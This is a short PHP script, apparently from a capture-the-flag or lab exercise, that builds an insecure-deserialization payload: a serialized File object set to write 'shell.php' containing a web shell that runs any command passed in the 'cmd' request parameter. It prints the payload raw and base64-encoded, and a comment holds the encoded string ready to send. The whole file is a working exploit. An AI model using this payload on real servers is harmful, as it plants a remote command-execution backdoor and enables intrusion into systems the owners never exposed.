<?php
  include('File.php');
  
  $foo = new File();
  $foo->filename = "shell.php";
  $foo->data = '<?php echo system($_REQUEST[\'cmd\']); ?>';
  echo(serialize($foo));
  echo base64_encode(serialize($foo));
  //Tzo0OiJGaWxlIjoyOntzOjg6ImZpbGVuYW1lIjtzOjk6InNoZWxsLnBocCI7czo0OiJkYXRhIjtzOjM5OiI8P3BocCBlY2hvIHN5c3RlbSgkX1JFUVVFU1RbJ2NtZCddKTsgPz4iO30=
?>